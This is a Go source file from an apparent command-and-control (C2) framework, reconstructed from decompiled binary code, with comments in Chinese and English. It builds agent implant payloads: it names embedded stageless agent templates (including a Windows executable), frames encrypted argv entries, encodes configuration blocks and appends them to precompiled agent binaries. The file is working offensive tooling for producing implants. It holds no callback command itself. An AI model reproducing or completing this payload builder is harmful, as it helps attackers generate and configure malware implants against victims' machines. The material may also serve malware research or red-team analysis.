package c2engine

import "encoding/binary"

// ============================================================================
// Agent payload asset templates and config patching (mirrors the original
// DownloadController)
// ============================================================================
//
// 原版从 //go:embed 的预编译二进制里取模板、改文件名、必要时修补配置；
// 反编译证据（v_windows_amd64.exe）：
//
//	FUN_018ddca0（Stageless，0x18ddca0）
//	  1) 与监听器协商后取回模板字节（FUN_00dad040 → FUN_0089ef80 →
//	     FUN_005e8cc0(local_100, local_868, 0x441, 0x1ed) 即
//	     map[0x441=1089]interface{}[0x1ed=493]：**已解密模板 1089 字节，
//	     密钥 493 字节**）；
//	  2) 若架构名不在"特殊"名单（FUN_01914540 / FUN_019147c0 两条家族 A/B
//	     字符串）中，则直接改名返回：
//	        特殊名单 → 用 FUN_018dca00 把 "-...=<密文>" 形式的 argv 参数
//	          追加到 argv 的尾部；
//	        命中 upx 开关（cVar3 = JsonGetBool("upx")）→ 追加
//	          "UPX0"/"UPX1"/"UPX2" 三段 + FUN_01914c40（家族 B）字符串；
//	        否则 → 追加 FUN_01914d20（家族 B，236 字节最长字符串）；
//	  3) FUN_018dca00(n) 生成时间戳文件名（FUN_0059d3e0 取当前时间 →
//	     FUN_0060f5e0 格式化），FUN_0044a940(...) 拼接扩展名；
//	  4) FUN_00c2a460 组装响应：body 经 FUN_005ed5e0 解析（gzip 流，
//	     魔数 FUN_005ed760(0x1bd7a05, 4, ..., 0x2000000)）后用
//	     FUN_0089e460 / FUN_0076fce0 判定内容，最后按 key
//	     DAT_01bd9b33="binary"（6 字节）写回；
//	5) 响应头由 FUN_00c28a40 设置：Content-Disposition、
//	     DAT_01bdac68="Expires"（7 字节）+ 值 "0"（DAT_1dbd4e60 的
//	     span{0,0x330}）、FUN_01913320（家族 B）与
//	     DAT_01bd97d9="Pragma"（6 字节）+ DAT_01bda44b="public"（6 字节）。
//
// 已还原为可直接使用的文件名模板（家族 A，见 po_decode.go 的回归向量）：
//
//	FUN_01912ac0 → "stageless/ebpf_%s_%s"
//	FUN_01912bc0 → "windows_amd64.exe"
//
// 家族 B 的具体字符串（FUN_01914a40/01914b40/01914c40/01914d20/01913320/
// 01913640）尚未完全解出（见 string_decrypt.go 的说明），因此本文件不写出
// 这些字符串的内容，只保留其来源函数地址与长度，供后续对齐。

// ---------------------------------------------------------------------------
// 家族 A 已还原的字符串
// Family-A strings recovered from the decompilation
// ---------------------------------------------------------------------------

const (
	// PoTplStagelessEBPF 是 DNS 传输型无阶段载荷的嵌入文件名模板
	// （反编译 FUN_01912ac0，家族 A 置换链，两个 %s 依次为 tp 与 arch）。
	PoTplStagelessEBPF = "stageless/ebpf_%s_%s"

	// PoDefaultArchSuffix 是 strageless 分支的默认架构后缀
	// （反编译 FUN_01912bc0，家族 A 置换链）。
	PoDefaultArchSuffix = "windows_amd64.exe"
)

// PoFamilyBStrings 记录尚未解出的家族 B 字符串的来源，便于后续对齐。
// 这些条目只描述函数地址、容器长度与用途，不含猜测内容。
var PoFamilyBStrings = []struct {
	Func string // 生成该字符串的构造器
	Len  int    // 构造器写出的字符串长度（FUN_0044ac40 的第三参数）
	Use  string // 用途
}{
	{"FUN_01914a40", 0x11, "Stage/Stageless 的架构特殊分支判定成员"},
	{"FUN_01914b40", 0x10, "同上（第二条成员）"},
	{"FUN_01914c40", 0x09, "upx 分支追加的 9 字节字符串"},
	{"FUN_01914d20", 0x5c, "strageless 非 upx 分支追加的 92 字节字符串"},
	{"FUN_01913320", 0x09, "Listen 响应头值；ListenDLL 的 Pragma 值"},
	{"FUN_01913640", 0x5d, "Listen 响应头值（93 字节）"},
}

// ---------------------------------------------------------------------------
// argv entry framing
// ---------------------------------------------------------------------------

// poArgvEntryKey 是原版 argv 条目 "<key>=<cipher>" 中的 2 字节 key。
//
// ⚠ 占位值 / PLACEHOLDER — 未从二进制恢复！
// {0x00,0x00} 不是反编译结果：FUN_018dca00 只能确认框架为
// [2 字节][0x3D '='][数据]，这两个字节由外层调用者提供（Ghidra 在该函数里
// 看到的是被后续 MOV 覆盖的栈槽）。它应当来自：FUN_018dca00 的调用方
// （Stageless FUN_018ddca0 / Listen FUN_018deec0 内联的闭包）。
// 该函数在 0x0000 下解引用会崩，所以这里返回错误而不是静默产出坏载荷。
//
// ⚠ PLACEHOLDER — NOT RECOVERED. The two bytes are supplied by FUN_018dca00's
// caller; dereferencing 0x0000 would crash the target agent, so PoArgvEntry
// refuses to build an entry until the real key is set.
var poArgvEntryKey []byte
var errMissingArgvKey = errString("c2engine: argv entry key not recovered (placeholder) — set it with SetPoArgvEntryKey")

// SetPoArgvEntryKey 设置 argv 条目的 2 字节 key（对应 FUN_018dca00 的第一参数）。
func SetPoArgvEntryKey(k []byte) {
	if len(k) != 2 {
		return
	}
	poArgvEntryKey = append([]byte{}, k...)
}

// PoArgvEntryReady 报告 argv key 是否已从二进制恢复。
func PoArgvEntryReady() bool { return len(poArgvEntryKey) == 2 }

// PoArgvEntry 按原版框架把密文包成 argv 条目：key(2) + '=' + data
// （对应 FUN_018dca00：先追加 2 字节与 0x3D，再追加数据）。
// argv key 未恢复时返回错误（见上面的占位说明），不产出会在目标上崩溃的载荷。
func PoArgvEntry(data []byte) ([]byte, error) {
	if !PoArgvEntryReady() {
		return nil, errMissingArgvKey
	}
	out := append([]byte{}, poArgvEntryKey...)
	out = append(out, '=')
	return append(out, data...), nil
}

// ---------------------------------------------------------------------------
// 配置块（字段名 + 16 字节值槽）
// Config block (field name + 16-byte value slot)
// ---------------------------------------------------------------------------

// PoField 是配置块中的一个字段。反编译 FUN_018d8d80 显示每个字段闭包输出
// = 名字（明文，位于 .rdata 字符串池）+ 16 字节值（写入顺序：4 字节 +
// 8 字节 + 4 字节，见该函数第 5 个块的 RSP 偏移 -0x18/-0x14/-0x10）。
type PoField struct {
	Name  string
	Value []byte
}

// poFieldValueSize 是单个字段值槽的长度（反编译 FUN_018d8d80 的
// "type" 闭包：写入长度 4，数据区 16 字节 = Go 字符串头 ptr+len）。
const poFieldValueSize = 16

// PoConfigBlock 把字段序列编码成配置块：
//
//	[名字明文][16 字节值槽]…  然后是字符串表
//	值槽 = u32 偏移 + u32 长度 + 8 字节保留（对应原版闭包捕获的 Go 字符串头）
//
// 名字是明文（原版二进制里可 ASCII 扫描到 "code"/"message"/"type"/"result"），
// 值放进尾部的字符串表，槽里只放偏移/长度——与原版把长字符串放在别处的做法一致。
func PoConfigBlock(fields []PoField) []byte {
	var out []byte
	var table []byte
	for _, f := range fields {
		out = append(out, f.Name...)
		slot := make([]byte, poFieldValueSize)
		binary.LittleEndian.PutUint32(slot[0:4], uint32(len(table)))
		binary.LittleEndian.PutUint32(slot[4:8], uint32(len(f.Value)))
		out = append(out, slot...)
		table = append(table, f.Value...)
	}
	return append(out, table...)
}

// ---------------------------------------------------------------------------
// 模板修补
// Template patching
// ---------------------------------------------------------------------------

// PoPatchResult 是一次载荷修补的结果。
type PoPatchResult struct {
	// Data 是修补后的完整二进制（模板 + 配置块 + argv 条目）。
	Data []byte
	// ConfigOffset 是配置块在 Data 中的起始偏移。
	ConfigOffset int
	// ArgvOffset 是 argv 条目在 Data 中的起始偏移（无 argv 时为 -1）。
	ArgvOffset int
}

// PatchPoPayload 在预编译模板尾部追加配置块与可选 argv 条目。
// 模板前缀逐字节保留（原版同样是"取模板 + 追加"而非就地改写）。
//
// PatchPoPayload appends the config block (and optional argv entry) to a
// pre-compiled template; the template prefix is preserved byte-for-byte.
func PatchPoPayload(template []byte, fields []PoField, argvEntry []byte) (*PoPatchResult, error) {
	if len(template) == 0 {
		return nil, errEmptyTemplate
	}
	out := append([]byte{}, template...)
	res := &PoPatchResult{ArgvOffset: -1}

	if len(fields) > 0 {
		res.ConfigOffset = len(out)
		out = append(out, PoConfigBlock(fields)...)
	}
	if len(argvEntry) > 0 {
		res.ArgvOffset = len(out)
		out = append(out, argvEntry...)
	}
	res.Data = out
	return res, nil
}

// errEmptyTemplate 表示没有可用的预编译模板。
var errEmptyTemplate = errString("c2engine: empty agent template")

// errString 是避免引入 errors 包的最小错误类型。
type errString string

func (e errString) Error() string { return string(e) }
